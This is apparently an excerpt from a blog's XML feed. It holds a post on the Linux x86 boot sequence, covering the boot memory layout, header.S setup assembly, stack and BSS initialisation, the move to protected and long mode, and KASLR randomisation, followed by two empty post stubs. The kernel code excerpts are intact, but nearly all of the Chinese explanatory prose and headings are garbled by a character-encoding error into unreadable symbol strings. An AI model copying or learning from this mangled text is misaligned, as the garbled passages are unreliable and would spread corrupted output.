<p>åœ¨å†…æ ¸è¢«å¼•å¯¼å…¥å†…å­˜åï¼Œå†…å­˜ä½¿ç”¨æƒ…å†µå¦‚ä¸‹</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">         | Protected-mode kernel  |</span><br><span class="line">100000   +------------------------+</span><br><span class="line">         | I/O memory hole        |</span><br><span class="line">0A0000   +------------------------+</span><br><span class="line">         | Reserved for BIOS      | Leave as much as possible unused</span><br><span class="line">         ~                        ~</span><br><span class="line">         | Command line           | (Can also be below the X+10000 mark)</span><br><span class="line">X+10000  +------------------------+</span><br><span class="line">         | Stack/heap             | For use by the kernel real-mode code.</span><br><span class="line">X+08000  +------------------------+</span><br><span class="line">         | Kernel setup           | The kernel real-mode code.</span><br><span class="line">         | Kernel boot sector     | The kernel legacy boot sector.</span><br><span class="line">       X +------------------------+</span><br><span class="line">         | Boot loader            | &lt;- Boot sector entry point 0x7C00</span><br><span class="line">001000   +------------------------+</span><br><span class="line">         | Reserved for MBR/BIOS  |</span><br><span class="line">000800   +------------------------+</span><br><span class="line">         | Typically used by MBR  |</span><br><span class="line">000600   +------------------------+</span><br><span class="line">         | BIOS use only          |</span><br><span class="line">000000   +------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="ç”±å†…æ ¸å‘åŠ›"><a href="#ç”±å†…æ ¸å‘åŠ›" class="headerlink" title="ç”±å†…æ ¸å‘åŠ›"></a>ç”±å†…æ ¸å‘åŠ›</h2><h3 id="å†…æ ¸è®¾ç½®"><a href="#å†…æ ¸è®¾ç½®" class="headerlink" title="å†…æ ¸è®¾ç½®"></a>å†…æ ¸è®¾ç½®</h3><p>æ­¤æ—¶å†…æ ¸å·²ç»è¢«å¼•å¯¼è¿›å…¥å†…å­˜ä¸­ï¼Œè™½ç„¶æ§åˆ¶æƒå·²ç»è½¬äº¤ç»™å†…æ ¸ï¼Œä½†æ˜¯å¹¶æœªçœŸæ­£çš„è¿è¡Œèµ·æ¥ï¼Œéœ€è¦è¿›è¡Œä¸€ç³»åˆ—çš„è®¾ç½®</p>
<p>å†…æ ¸è®¾ç½®ä»£ç çš„èµ·ç‚¹æ˜¯ <code>/arch/x86/boot/header.S</code>ï¼ŒåŸå…ˆ kernel ä¼šè‡ªå¸¦ bootloader è¿›è¡Œå¯åŠ¨ï¼Œä½†æ˜¯ç°åœ¨ä»…è¾“å‡ºé”™è¯¯ä¿¡æ¯</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	.global bootsect_start</span><br><span class="line">bootsect_start:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifdef CONFIG_EFI_STUB</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">&quot;MZ&quot;</span>, MS-DOS header</span></span><br><span class="line">	.word	MZ_MAGIC</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Normalize the start address</span></span><br><span class="line">	ljmp	$BOOTSEG, $start2</span><br><span class="line"></span><br><span class="line">start2:</span><br><span class="line">	movw	%cs, %ax</span><br><span class="line">	movw	%ax, %ds</span><br><span class="line">	movw	%ax, %es</span><br><span class="line">	movw	%ax, %ss</span><br><span class="line">	xorw	%sp, %sp</span><br><span class="line">	sti</span><br><span class="line">	cld</span><br><span class="line"></span><br><span class="line">	movw	$bugger_off_msg, %si</span><br><span class="line"></span><br><span class="line">bugger_off_msg:</span><br><span class="line">	.ascii	&quot;Use a boot loader.\r\n&quot;</span><br><span class="line">	.ascii	&quot;\n&quot;</span><br><span class="line">	.ascii	&quot;Remove disk and press any key to reboot...\r\n&quot;</span><br><span class="line">	.byte	0</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨å°†ä¼šä» <code>_start</code> å¼€å§‹</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">offset 512, entry point // 0x200 åç§»å¤„</span></span><br><span class="line"></span><br><span class="line">	.globl	_start</span><br><span class="line">_start:</span><br><span class="line">        .byte	0xeb		# short (2-byte) jump</span><br><span class="line">        .byte	start_of_setup-1f // è·³è½¬åˆ° setup é˜¶æ®µ</span><br><span class="line">1: // setup header ç»“æ„</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	.section &quot;.entrytext&quot;, &quot;ax&quot;</span><br><span class="line">start_of_setup:</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œéœ€è¦äº†è§£åˆ°ï¼Œåœ¨ä» <code>GRUB</code> è·³è½¬åˆ° <code>_start</code> æ—¶ï¼Œè®¾ç½®çš„ä»£ç å¦‚ä¸‹ï¼Œå³å°† CS ä»£ç æ®µåç§»å¢åŠ  <code>0x20</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">state.gs = state.fs = state.es = state.ds = state.ss = segment;</span><br><span class="line">state.cs = segment + 0x20;</span><br></pre></td></tr></table></figure>

<h3 id="start-of-setup"><a href="#start-of-setup" class="headerlink" title="start_of_setup"></a>start_of_setup</h3><p><strong>æ®µå¯„å­˜å™¨è®¾ç½®</strong><br>é¦–å…ˆå¯¹æ®µå¯„å­˜å™¨è¿›è¡Œè®¾ç½®ï¼Œå¼ºåˆ¶ ES æ®µä¸ DS æ®µç›¸åŒ</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Force %es = %ds</span></span><br><span class="line">	movw	%ds, %ax</span><br><span class="line">	movw	%ax, %es</span><br><span class="line">	cld</span><br></pre></td></tr></table></figure>
<p>éšåå¯¹ SS æ®µè¿›è¡Œè®¾ç½®ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p>
<ul>
<li>é¦–å…ˆåˆ¤æ–­ SS æ®µä¸ DS ES æ®µæ˜¯å¦ç›¸åŒï¼Œå¹¶å°† SP å¯„å­˜å™¨æ”¾åœ¨ dx å¯„å­˜å™¨å†…<ul>
<li>å¦‚æœç›¸åŒåˆ™è·³è½¬åˆ° 2fï¼Œå¯¹ dx å³ sp å¯„å­˜å™¨è¿›è¡Œå¯¹é½æ“ä½œï¼Œ<ul>
<li>å¦‚æœå¤±è´¥åˆ™å°† sp è®¾ç½®ä¸º <code>0xfffc</code></li>
<li>å¦‚æœæ­£ç¡®ç»“æŸ</li>
</ul>
</li>
<li>å¦‚æœä¸ç›¸åŒåˆ™æ„é€ æ–°çš„æ ˆï¼Œé¦–å…ˆå°† <code>_end</code> è®¾ç½®ç»™ dxï¼Œå¹¶åˆ¤æ–­æ˜¯å¦è®¾ç½® <code>CAN_USE_HEAP</code><ul>
<li>å¦‚æœè®¾ç½®ï¼Œåˆ™å°† heap_end_ptr ç½®äº dx å¯„å­˜å™¨ï¼ŒåŠ ä¸Š <code>STACK_SIZE</code></li>
<li>å¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™å°† dx ç›´æ¥åŠ ä¸Š <code>STACK_SIZE</code><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	movw	%ss, %dx</span><br><span class="line">	cmpw	%ax, %dx	# %ds == %ss?</span><br><span class="line">	movw	%sp, %dx</span><br><span class="line">	je	2f		# -&gt; assume %sp is reasonably set</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Invalid %ss, make up a new stack</span></span><br><span class="line">	movw	$_end, %dx</span><br><span class="line">	testb	$CAN_USE_HEAP, loadflags</span><br><span class="line">	jz	1f</span><br><span class="line">	movw	heap_end_ptr, %dx</span><br><span class="line">1:	addw	$STACK_SIZE, %dx</span><br><span class="line">	jnc	2f</span><br><span class="line">	xorw	%dx, %dx	# Prevent wraparound</span><br><span class="line"></span><br><span class="line">2:	# Now %dx should point to the end of our stack space</span><br><span class="line">	andw	$~3, %dx	# dword align (might as well...)</span><br><span class="line">	jnz	3f</span><br><span class="line">	movw	$0xfffc, %dx	# Make sure we&#x27;re not zero</span><br><span class="line">3:	movw	%ax, %ss</span><br><span class="line">	movzwl	%dx, %esp	# Clear upper half of %esp</span><br><span class="line">	sti			# Now we should have a working stack</span><br></pre></td></tr></table></figure>
å°† DS æ®µä¸ CS æ®µç½®ä¸ºåŒå€¼<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	pushw	%ds</span><br><span class="line">	pushw	$6f</span><br><span class="line">	lretw</span><br><span class="line">6:</span><br></pre></td></tr></table></figure>
æ­¤æ—¶ï¼Œå¦‚æœ SS &#x3D;&#x3D; DSï¼Œç›®å‰çš„å †æ ˆæƒ…å†µä¸ºï¼š<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132021604.png"><br>å¦‚æœ SS !&#x3D; DSï¼Œä¸” è®¾ç½® USE_HEAPï¼Œåˆ™å †æ ˆæƒ…å†µä¸ºï¼š<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132023418.png"><br>å¦‚æœ SS !&#x3D; DSï¼Œä¸”ä¸è®¾ç½® USE_HEAPï¼Œåˆ™å †æ ˆæƒ…å†µä¸ºï¼š<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132024069.png"></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>BSS æ®µè®¾ç½®</strong><br>BSS æ®µä¸»è¦ç”¨æ¥å­˜æ”¾æ²¡æœ‰è¢«åˆå§‹åŒ–çš„é™æ€å˜é‡ï¼Œå¯¹äºæ­¤æ®µçš„å†…å­˜ï¼Œlinux å°†ä¼šå¯¹é½è¿›è¡Œæ¸…é›¶</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">movw    $__bss_start, %di</span><br><span class="line">movw    $_end+3, %cx</span><br><span class="line">xorl    %eax, %eax</span><br><span class="line">subw    %di, %cx</span><br><span class="line">shrw    $2, %cx</span><br><span class="line">rep; stosl</span><br></pre></td></tr></table></figure>
<p>ä»£ç æ‰§è¡Œå®Œæ¯•åï¼Œå°†å¯¹å¾—åˆ°å¦‚ä¸‹BSSæ®µ<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132027504.png"></p>
<p>ç´§æ¥ç€å°±è·³è½¬åˆ° <code>main</code> å‡½æ•°æ‰§è¡Œ C ä»£ç </p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Jump to C code (should not <span class="built_in">return</span>)</span></span><br><span class="line">	calll	main</span><br></pre></td></tr></table></figure>

<h2 id="å‡†å¤‡å¯åŠ¨"><a href="#å‡†å¤‡å¯åŠ¨" class="headerlink" title="å‡†å¤‡å¯åŠ¨"></a>å‡†å¤‡å¯åŠ¨</h2><h3 id="ä¿æŠ¤æ¨¡å¼"><a href="#ä¿æŠ¤æ¨¡å¼" class="headerlink" title="ä¿æŠ¤æ¨¡å¼"></a>ä¿æŠ¤æ¨¡å¼</h3><p>é¦–å…ˆç®€è¦ä»‹ç»ä¸€ä¸‹ä¿æŠ¤æ¨¡å¼å’Œå®æ¨¡å¼çš„åŒºåˆ«ï¼Œå› ä¸ºåœ¨64ä½æ“ä½œç³»ç»Ÿä¹‹å‰ï¼Œå†…æ ¸å¿…é¡»åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼æ‰èƒ½è¿è¡Œ</p>
<p>ä¿æŠ¤æ¨¡å¼çš„ä¸»è¦æ”¹å˜ï¼š</p>
<ul>
<li>å°†å®æ¨¡å¼çš„20æ ¹åœ°å€çº¿è½¬æ¢ä¸º32ä½ï¼Œç³»ç»Ÿå¯ä»¥è®¿é—®å¤šè¾¾ 4G çš„åœ°å€ç©ºé—´</li>
<li>å¼•å…¥å†…å­˜åˆ†é¡µç®¡ç†æ–¹æ³•</li>
</ul>
<p>åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œå†…å­˜æ®µçš„å¤§å°å’Œä½ç½®ä½¿ç”¨ <code>æ®µæè¿°ç¬¦</code> è¿›è¡Œæè¿°ï¼Œé€šè¿‡æ®µæè¿°ç¬¦å¯ä»¥çŸ¥é“æ®µçš„å±æ€§å’ŒçŠ¶æ€ï¼Œæ®µæè¿°ç¬¦çš„ä¸»è¦ç»“æ„å¦‚ä¸‹ï¼Œæ¯ä¸ªæè¿°ç¬¦çš„é•¿åº¦æ˜¯ 64 ä½ï¼Œå‡å­˜å‚¨åœ¨ <code>å…¨å±€æè¿°ç¬¦è¡¨ GDT</code> ä¸­</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">31          24        19      16              7            0</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|             | |B| |A|       | |   | |0|E|W|A|            |</span><br><span class="line">| BASE 31:24  |G|/|L|V| LIMIT |P|DPL|S|  TYPE | BASE 23:16 | 4</span><br><span class="line">|             | |D| |L| 19:16 | |   | |1|C|R|A|            |</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|                             |                            |</span><br><span class="line">|        BASE 15:0            |       LIMIT 15:0           | 0</span><br><span class="line">|                             |                            |</span><br><span class="line">------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>å…¨å±€æè¿°ç¬¦è¡¨ åœ¨å†…å­˜ä¸­çš„ä½ç½®ä¸å®šï¼Œå…¶åœ°å€ä¿å­˜åœ¨ <code>GDTR</code> ç‰¹æ®Šå¯„å­˜å™¨ä¸­ï¼Œæ±‡ç¼–ä»£ç å¤§æ¦‚æ˜¯ <code>lgdt gdt</code>ï¼ŒGDTR æ˜¯ 48 ä½å¯„å­˜å™¨ï¼ŒåŸºå€ 32 ä½ï¼Œå¤§å° 16 ä½ã€‚</p>
<p>è€Œæ­¤æ—¶æ‰€è°“çš„æ®µå¯„å­˜å™¨ DS SS ES ç­‰å­˜å‚¨çš„å‡æ˜¯ <code>æ®µé€‰æ‹©å­</code>ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼Œå³ CPU é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ‰¾åˆ°ç‰©ç†åœ°å€ï¼šæ®µé€‰æ‹©å­-&gt;æ®µæè¿°ç¬¦-&gt;æ®µåŸºå€+åç§»</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">-----------------------------</span><br><span class="line">|       Index    | TI | RPL |</span><br><span class="line">-----------------------------</span><br><span class="line">GDT æ®µæè¿°ç¬¦ç´¢å¼•å· ï½œGDT or LDT ï½œ è¯·æ±‚ä¼˜å…ˆçº§</span><br></pre></td></tr></table></figure>

<p>ä»å®æ¨¡å¼è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œéœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p>
<ul>
<li>ç¦æ­¢ä¸­æ–­å‘ç”Ÿ</li>
<li>ä½¿ç”¨å‘½ä»¤å°† GDT è£…å…¥ GDTR</li>
<li>è®¾ç½® CR0 PE ä½ä¸º 1ï¼Œä½¿å¯„å­˜å™¨è¿›å…¥ä¿æŠ¤æ¨¡å¼</li>
<li>è·³è½¬æ‰§è¡Œä¿æŠ¤æ¨¡å¼ä»£ç </li>
</ul>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>å¯ä»¥æå‰çœ‹åˆ°ï¼Œæ­¤å¤„åœ¨å®æ¨¡å¼ä¸‹å†…æ ¸åŸºæœ¬é…ç½®å®Œæˆåï¼Œå¯¹ç¡¬ä»¶çš„ä¸€äº›ä¿¡æ¯è·å–ï¼Œå¦‚ CPU å†…å­˜ é”®ç›˜<br><strong>copy_boot_params</strong><br>æ­¤å¤„ä¸»è¦æ˜¯å°†å‰é¢å®šä¹‰çš„ <code>struct setup_header hdr</code> æ‹·è´åˆ° <code>boot params</code> ä¸­<br><strong>console_init</strong><br>åˆå§‹åŒ–å‘½ä»¤è¡Œï¼Œé€šè¿‡åˆ†æ <code>earlyprintk</code>ï¼Œå¯¹ç›¸åº”ä¸²å£è¿›è¡Œåˆå§‹åŒ–<br><strong>init_heap</strong><br>åœ¨å‰é¢è®¾ç½®è¿‡ç¨‹ä¸­å¯¹å †æ ˆå’ŒBSSè¿›è¡Œåˆå§‹åŒ–åï¼Œå†…æ ¸éœ€è¦åˆå§‹åŒ–å…¨å±€å †ï¼Œå³æ­¤å‡½æ•°å¾—ç›®æ ‡ï¼Œä¸»è¦æµç¨‹æ˜¯é€šè¿‡è®¡ç®— <code>stack_end</code> å’Œ <code>heap_end</code> å¯¹å †è¿›è¡Œåˆå§‹åŒ–<br><strong>validate_cpu</strong><br>æ­¤å¤„å¯¹ CPU çš„ç±»å‹è¿›è¡Œæ£€æŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦äº†è§£ï¼š</p>
<ul>
<li>å¦‚æœ CPU æ ‡å¿—ä¸º 64 ä½ï¼Œåˆ™è®¾ç½® long mode</li>
<li>æ ¹æ®åˆ¶é€ å•†çš„ä¸åŒï¼Œè®¾ç½®ä¸åŒçš„CPUé€‰é¡¹</li>
</ul>
<p><strong>set_bios_mode</strong><br>å‘ŠçŸ¥ BIOS æˆ‘ä»¬å°†è¦è¿è¡Œåœ¨ä»€ä¹ˆCPUæ¨¡å¼ä¸‹<br><strong>detect_memory</strong><br>å†…å­˜ä¾¦æµ‹ä¸»è¦æ˜¯å¾—åˆ°å½“å‰å†…å­˜çš„ä½¿ç”¨åˆ†å¸ƒï¼Œé€šå¸¸ä½¿ç”¨å¤šç§ç¼–ç¨‹æ¥å£<br><strong>keyboard_init</strong><br>é€šè¿‡ 0x16 ä¸­æ–­è·å–é”®ç›˜çŠ¶æ€å¹¶è®¾ç½®æŒ‰é”®æ£€æµ‹é¢‘ç‡<br><strong>ç³»ç»Ÿå‚æ•°æŸ¥è¯¢</strong><br>ç³»ç»Ÿå‚æ•°æŸ¥è¯¢ï¼Œè¿™é‡Œä¸»è¦æœ‰ï¼š</p>
<ul>
<li>ist</li>
<li>apm_bios</li>
<li>edd</li>
</ul>
<p><strong>set_video</strong><br>ä¾æ—§æ˜¯é€šè¿‡ä¹‹å‰çš„ <code>setup hdr</code> æ•°æ®ç»“æ„è¿›è¡Œè·å–åˆå§‹å‚æ•°ï¼Œé€šè¿‡å¯¹å†…å­˜ heap è¿›è¡Œè¯»å†™</p>
<p><strong>go_to_protected_mode</strong><br>æ­¤å¤„å°†è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ï¼š</p>
<ol>
<li>setup_idt è®¾ç½®ä¸­æ–­æè¿°ç¬¦è¡¨ <code>lidtl null_idt</code></li>
<li>setup_gdt è®¾ç½®å…¨å±€æè¿°ç¬¦è¡¨ <code>lgdtl gdt</code></li>
<li>protected_mode_jump ä¿æŠ¤æ¨¡å¼è·³è½¬</li>
</ol>
<p>ä¿æŠ¤æ¨¡å¼ä¸‹ä»£ç çš„ç¬¬ä¸€æ­¥ä¼šé‡ç½®æ‰€æœ‰æ®µå¯„å­˜å™¨ï¼ˆCS é™¤å¤–ï¼‰ï¼Œå°†ä»–ä»¬æŒ‡å‘æ•°æ®æ®µï¼Œå¹¶å°†é€šç”¨å¯„å­˜å™¨æ¸…é›¶ï¼ˆeax é™¤å¤–ï¼‰</p>
<h2 id="è¿‡æ¸¡-64-ä½æ¨¡å¼"><a href="#è¿‡æ¸¡-64-ä½æ¨¡å¼" class="headerlink" title="è¿‡æ¸¡ 64 ä½æ¨¡å¼"></a>è¿‡æ¸¡ 64 ä½æ¨¡å¼</h2><p>åœ¨ x86 linux å†…æ ¸å¼•å¯¼åè®®ä¸­å†™åˆ°<br><code>å½“ä½¿ç”¨ bzImage æ—¶ï¼Œä¿æŠ¤æ¨¡å¼ä¸‹å†…æ ¸è¢«é‡å®šä½è‡³ 0x100000 å¤„</code></p>
<p><strong>32 ä½å…¥å£ç‚¹</strong><br>æºç ä½ç½®ï¼š<code>/arch/x86/boot/compressed/head_64.S</code></p>
<p>ä¸ºä»€ä¹ˆç§°ä¹‹ä¸º compressedï¼Œå› ä¸º <code>bzImage</code> æ˜¯ç”± <code>vmlinux + å¤´æ–‡ä»¶ + å†…æ ¸å¯åŠ¨ä»£ç </code> é€šè¿‡ gzip å‹ç¼©å¾—æ¥ï¼Œå› æ­¤æºç ä¸»è¦è¿›è¡Œåˆ‡æ¢æ¨¡å¼çš„å‡†å¤‡å·¥ä½œï¼Œåœ¨è¿›å…¥é•¿æ¨¡å¼åå†è§£å‹å†…æ ¸</p>
<p><strong>è®¡ç®—é‡å®šä½åœ°å€</strong></p>
<p>åœ¨å¿…è¦çš„æ—¶å€™è®¡ç®—è§£å‹ç¼©ä¹‹åçš„åœ°å€ï¼Œé»˜è®¤çš„å†…æ ¸åŸºåœ°å€ç”±å†…æ ¸ç¼–è¯‘é¡¹ <code>CONFIG_PHYSICAL_START</code> æ‰€ç¡®å®šï¼Œå…¶é»˜è®¤å€¼ä¸º <code>0x1000000</code></p>
<p><strong>é•¿æ¨¡å¼</strong><br>é•¿æ¨¡å¼æ˜¯ X86_64 çš„åŸç”Ÿæ¨¡å¼ï¼Œä¸ºäº†åˆ‡æ¢ï¼Œéœ€è¦è¿›è¡Œä¸€ä¸‹æ“ä½œï¼š</p>
<ul>
<li>å¯ç”¨ PAE</li>
<li>å»ºç«‹é¡µè¡¨å¹¶å°†é¡¶çº§é¡µè¡¨åœ°å€æ”¾å…¥ cr3 å¯„å­˜å™¨</li>
<li>å¯ç”¨ EFER.LME</li>
<li>å¯ç”¨åˆ†é¡µ - è®¾ç½® <code>cr0</code> å¯„å­˜å™¨çš„ <code>PG</code> å’Œ <code>PE</code> å¯åŠ¨åˆ†é¡µ</li>
</ul>
<p><strong>åˆæœŸé¡µè¡¨åˆå§‹åŒ–</strong><br>Linux å†…æ ¸ä½¿ç”¨ 4 çº§é¡µè¡¨ï¼Œå¯ä»¥æ„å»ºåˆå§‹ 4G é¡µè¡¨ï¼Œæ˜ å°„ 4G å†…å­˜</p>
<ul>
<li>4 çº§é¡µæ˜ å°„è¡¨ - 1</li>
<li>é¡µç›®å½•æŒ‡é’ˆè¡¨ - 1</li>
<li>é¡µç›®å½•è¡¨ - 4</li>
</ul>
<h2 id="å†…æ ¸è§£å‹ç¼©-åŠ è½½åœ°å€éšæœºåŒ–"><a href="#å†…æ ¸è§£å‹ç¼©-åŠ è½½åœ°å€éšæœºåŒ–" class="headerlink" title="å†…æ ¸è§£å‹ç¼© - åŠ è½½åœ°å€éšæœºåŒ–"></a>å†…æ ¸è§£å‹ç¼© - åŠ è½½åœ°å€éšæœºåŒ–</h2><p>æºç å…¥å£ï¼š<code>arch/x86/boot/compressed/misc.c/extract_kernel() -&gt; choose_random_location</code></p>
<p>å¯ä»¥å‚è€ƒï¼š<code>/Documentation/x86/x86_64/mm.rst</code><br>é¦–å…ˆå¯¹ä¸€äº›é…ç½®çš„é»˜è®¤è®¾ç½®è¿›è¡Œåˆ†æ</p>
<ul>
<li>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœ X86_64 å¼€å¯ 4 çº§é¡µè¡¨ï¼Œåˆ™é¡µçš„é»˜è®¤åç§»åŸºå€ä¸º <code>0xffff888000000000</code>ï¼Œé¡µçš„å¯¹é½å¤§å°å¿…é¡»æ˜¯å¤„äº <code>0x200000</code> åˆ° <code>0x1000000ï¼Œå³</code> 2M åˆ° 16Mï¼Œä¸”æ˜¯ <code>0x200000</code> çš„å€æ•°</li>
<li>å†…æ ¸æ˜ å°„çš„åŸºç¡€åœ°å€ä¸º <code>0xffffffff80000000</code>ï¼Œå¦‚æœå¯ç”¨ KASLR åˆ™å†…æ ¸é•œåƒå¤§å°ä¸º 1Gï¼Œå¦åˆ™ä¸º 512M<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __PAGE_OFFSET_BASE_L5	_AC(0xff11000000000000, UL)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __PAGE_OFFSET_BASE_L4	_AC(0xffff888000000000, UL)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __START_KERNEL_map	_AC(0xffffffff80000000, UL)</span></span><br><span class="line"></span><br><span class="line">config PHYSICAL_START</span><br><span class="line">	hex &quot;Physical address where the kernel is loaded&quot; if (EXPERT || CRASH_DUMP)</span><br><span class="line">	default &quot;0x1000000&quot;</span><br><span class="line"></span><br><span class="line">config PHYSICAL_ALIGN</span><br><span class="line">	hex &quot;Alignment value to which kernel should be aligned&quot;</span><br><span class="line">	default &quot;0x200000&quot;</span><br><span class="line">	range 0x2000 0x1000000 if X86_32</span><br><span class="line">	range 0x200000 0x1000000 if X86_64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifdef CONFIG_RANDOMIZE_BASE</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define KERNEL_IMAGE_SIZE	(1024 * 1024 * 1024) // 1G</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define KERNEL_IMAGE_SIZE	(512 * 1024 * 1024) // 512M</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>æ¥ä¸‹æ¥åˆ†æé€‰å–éšæœºåŒ–çš„æµç¨‹ï¼š</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// åˆ¤æ–­æ˜¯å¦ä¼ å…¥ nokaslr ä¿¡å·</span><br><span class="line">if (cmdline_find_option_bool(&quot;nokaslr&quot;)) &#123;</span><br><span class="line">    warn(&quot;KASLR disabled: &#x27;nokaslr&#x27; on cmdline.&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// å¯¹å†…å­˜è¿›è¡Œé™åˆ¶</span><br><span class="line">if (IS_ENABLED(CONFIG_X86_32))</span><br><span class="line">    mem_limit = KERNEL_IMAGE_SIZE;</span><br><span class="line">else</span><br><span class="line">    mem_limit = MAXMEM;</span><br><span class="line"></span><br><span class="line">// è®°å½•éå®‰å…¨åŒºåŸŸï¼Œåœ¨éšæœºè¿‡ç¨‹ä¸­è¿›è¡Œè§„é¿</span><br><span class="line">mem_avoid_init(input, input_size, *output);</span><br><span class="line"></span><br><span class="line">// ç‰©ç†åœ°å€éšæœºåŒ–</span><br><span class="line">random_addr = find_random_phys_addr(min_addr, output_size);</span><br><span class="line"></span><br><span class="line">// è™šæ‹Ÿåœ°å€éšæœºåŒ–</span><br><span class="line">random_addr = find_random_virt_addr(LOAD_PHYSICAL_ADDR, output_size);</span><br></pre></td></tr></table></figure>
<p>å¯»æ‰¾éšæœºç‰©ç†åœ°å€å’Œéšæœºè™šæ‹Ÿåœ°å€çš„å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// ä½¿ç”¨ efi æˆ– e820 è¿›è¡Œæœç´¢æ»¡è¶³æ¡ä»¶çš„åˆ†é…åŒºå¹¶è®°å½•åœ¨ slot_area æ•°ç»„ä¸­</span><br><span class="line">if (!process_efi_entries(minimum, image_size))</span><br><span class="line">		process_e820_entries(minimum, image_size);</span><br><span class="line"></span><br><span class="line">// éšæœºè·å– slot area</span><br><span class="line">slots_fetch_random();</span><br><span class="line">    // ä½¿ç”¨ RDRAND / RDTSC / i8254 è¿›è¡Œéšæœºæ•°è·å–</span><br><span class="line">    - slot = kaslr_get_random_long(&quot;Physical&quot;) % slot_max;</span><br><span class="line">    // é€šè¿‡é€æ­¥å‡å°‘çš„æ–¹å¼ç¡®å®š slot</span><br><span class="line">	for (i = 0; i &lt; slot_area_index; i++) &#123;</span><br><span class="line">		if (slot &gt;= slot_areas[i].num) &#123;</span><br><span class="line">			slot -= slot_areas[i].num;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		return slot_areas[i].addr + ((u64)slot * CONFIG_PHYSICAL_ALIGN);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Command Line Guide - CLI</title>
    <url>/2022/05/13/Command-Line-Guide/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="CLI-å®‰è£…"><a href="#CLI-å®‰è£…" class="headerlink" title="CLI å®‰è£…"></a>CLI å®‰è£…</h1><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><h3 id="Extensions"><a href="#Extensions" class="headerlink" title="Extensions"></a>Extensions</h3>]]></content>
      <categories>
        <category>æ‚é¡¹</category>
      </categories>
      <tags>
        <tag>Command</tag>
      </tags>
  </entry>
  <entry>
    <title>awesome-recommand</title>
    <url>/2022/05/13/awesome-recommand/</url>
    <content><![CDATA[<span id="more"></span>

